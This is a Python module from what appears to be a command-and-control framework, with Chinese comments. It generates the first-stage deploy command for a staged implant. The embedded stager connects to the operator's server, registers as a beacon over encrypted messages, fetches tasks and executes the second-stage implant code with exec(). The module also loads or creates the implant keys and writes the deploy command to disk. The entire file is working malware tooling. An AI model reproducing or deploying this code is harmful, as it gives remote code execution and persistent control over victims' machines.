"""
@module: agent_stager
@desc: 生成分段载荷第一段(引导)部署命令: 目标机执行引导 → 连 server 注册 →
收到 server 端 stage 命令设定的第二段(init 任务) → exec → 完整植入物以同 id 继续注册。
第二段用 `stage <代码...>` 命令设定(s_exec stage), 新 beacon 首次上线下发。
@params: host port
"""

import json
import os
import secrets

from server.core.bootstrap import deploy_command
from server.core.config import load_config
from server.transports.agent_base import relay_code

MODULE = {
    "desc": "生成分段载荷第一段(引导)部署命令, 第二段由 stage 命令设定",
    "params": [("host", "必填, server 地址"),
               ("port", "必填, server beacon 端口"),
               ("server_key_hex", "可选, 默认读 config.json")],
}

_DEFAULT_OUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "s_modules", "output")

# 引导逻辑: 注册(随机 id) → welcome → FETCH → 收 TASKS → exec init 任务(第二段)
# 注意: relay_code 生成的密钥名是 _SK(server_key)/_AK(agent_key), 与 server 通信用 _SK
_STAGER_TAIL = '''
u=a.socket()
try:
 u.settimeout(20);u.connect((_SH,_SP))
 u.sendall(l.token_bytes(256))
 # 同 id 语义: 先把引导 id 存入全局 BEACON_ID, 第二段(完整植入物)exec 时
 # 模板复用同一 id 注册——否则新 id 触发 server 再次下发 stage, 二次 exec
 # 重置 _KNOWN/_PENDING/_ACTIVE 并泄漏线程(2026-08-27 修复)
 globals().setdefault("BEACON_ID", l.token_hex(8))
 S(u,e.dumps({"type":"register","version":2,"role":"beacon","id":globals().get("BEACON_ID"),"batch":True}).encode(),_SK)
 w=R(u,_SK)
 if not w:raise Exception()
 S(u,e.dumps({"type":"fetch"}).encode(),_SK)
 m=e.loads(R(u,_SK).decode())
 for _t in (m.get("tasks") or []):
  if _t.get("init"):
   exec(_t["code"],globals())
except Exception as _e:
 print("stager-err:",_e)
finally:
 try:u.close()
 except:pass
'''


def run(host, port, server_key_hex=None, out_dir=None):
    from server.core.config import ServerConfig
    if server_key_hex:
        if len(server_key_hex) != 64:
            return {"status": "error",
                    "message": f"key_hex 长度错误({len(server_key_hex)} 字符, 需要 64)"}
        server_key = bytes.fromhex(server_key_hex)
    else:
        # 与 agent_* 一致: 从 server/config.json 读 implant_key
        _SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        _cfg_path = os.path.join(_SERVER_DIR, "config.json")
        try:
            with open(_cfg_path, encoding="utf-8") as _f:
                _raw = json.load(_f)
        except OSError:
            _raw = {}
        key_hex = _raw.get("implant_key", "")
        if not key_hex or len(key_hex) != 64:
            return {"status": "error",
                    "message": "config.json 无有效 implant_key。请先 s_exec keygen。"}
        server_key = bytes.fromhex(key_hex)

    agent_key = secrets.token_bytes(32)
    code = relay_code(str(list(server_key)).replace(" ", ""),
                      str(list(agent_key)).replace(" ", ""),
                      host, port, "agent_stager", long_lived=False)
    # 复用加密函数头(import + 密钥 + E/S/R/D), 追加引导逻辑
    head = code.split("def relay_tx")[0]
    stager = head + _STAGER_TAIL
    compile(stager, "<agent_stager>", "exec")  # 生成即校验

    command = deploy_command(stager)
    out_dir = out_dir or _DEFAULT_OUT
    os.makedirs(out_dir, exist_ok=True)
    files = {
        "xor_key": os.path.join(out_dir, "agent_stager_key.hex"),
        "command": os.path.join(out_dir, "agent_stager_command.txt"),
    }
    with open(files["xor_key"], "w", encoding="utf-8") as f:
        f.write(agent_key.hex() + "\n")
    with open(files["command"], "w", encoding="utf-8") as f:
        f.write(command + "\n")

    return {
        "status": "ok",
        "deploy": command,
        "code": stager,
        "files": files,
        "note": ("分段载荷第一段(引导): 部署后连 server 拉取第二段; "
                 "第二段用 `stage <代码...>` 设定(s_exec stage), "
                 "新 beacon 首次上线下发"),
    }
